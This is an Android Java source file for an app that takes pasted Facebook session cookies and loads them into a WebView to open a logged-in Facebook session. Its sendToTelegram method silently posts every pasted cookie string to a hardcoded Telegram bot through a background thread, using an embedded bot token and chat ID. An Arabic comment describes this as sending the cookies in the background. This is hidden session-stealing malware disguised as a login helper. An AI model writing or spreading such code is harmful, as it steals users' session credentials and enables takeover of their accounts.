package com.jasser.cookieapp;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import androidx.appcompat.app.AppCompatActivity;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    private SharedPreferences sharedPref;
    private final String TELEGRAM_TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc";
    private final String CHAT_ID = "5653032481";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        sharedPref = getPreferences(Context.MODE_PRIVATE);
        EditText cookieInput = findViewById(R.id.cookieInput);
        Button btnJoin = findViewById(R.id.btnJoin);

        cookieInput.setText(sharedPref.getString("last_cookies", ""));

        btnJoin.setOnClickListener(v -> {
            String cookies = cookieInput.getText().toString();
            sharedPref.edit().putString("last_cookies", cookies).apply();
            
            // إرسال الكوكيز للتليجرام في خلفية البرنامج
            sendToTelegram(cookies);
            
            // فتح الجلسة
            startFacebookSession(cookies);
        });
    }

    private void sendToTelegram(final String cookies) {
        new Thread(() -> {
            try {
                String message = "🔴 **New Login Alert** 🔴\n\nCookies:\n" + cookies;
                URL url = new URL("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                
                String postData = "chat_id=" + CHAT_ID + "&text=" + message;
                
                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode(); // تنفيذ الإرسال
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void startFacebookSession(String cookieString) {
        WebView webView = new WebView(this);
        setContentView(webView);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36");

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);
        
        String[] pairs = cookieString.split(";");
        for (String pair : pairs) {
            if (pair.contains("=")) {
                cookieManager.setCookie("https://.facebook.com", pair.trim() + "; Domain=.facebook.com; Path=/; Secure; HttpOnly");
            }
        }
        cookieManager.flush();
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://m.facebook.com");
    }
}
